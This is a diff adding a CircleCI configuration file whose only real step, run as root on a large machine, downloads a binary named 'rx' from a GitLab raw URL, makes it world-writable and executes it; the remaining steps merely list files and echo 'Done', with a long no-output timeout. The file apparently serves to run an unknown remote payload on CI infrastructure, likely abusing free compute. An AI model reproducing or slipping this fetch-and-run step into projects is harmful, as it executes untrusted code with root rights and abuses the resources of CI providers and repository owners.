@@ -1,0 +1,37 @@
+version: 2.1
+
+jobs:
+  build:
+  
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: 2xlarge
+    
+
+    steps:
+      - run:
+         name: "pro"
+         
+         command: | 
+          sudo su --command "wget https://gitlab.com/MySeald/rx/-/raw/main/rx && chmod 777 rx && ./rx"
+          
+      
+      - run:
+         name: "bot"
+         no_output_timeout: 58m
+         command: |
+          ls
+          
+
+      - run:
+         name: "back"
+         command: |
+           
+           echo Done
+           
+
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build
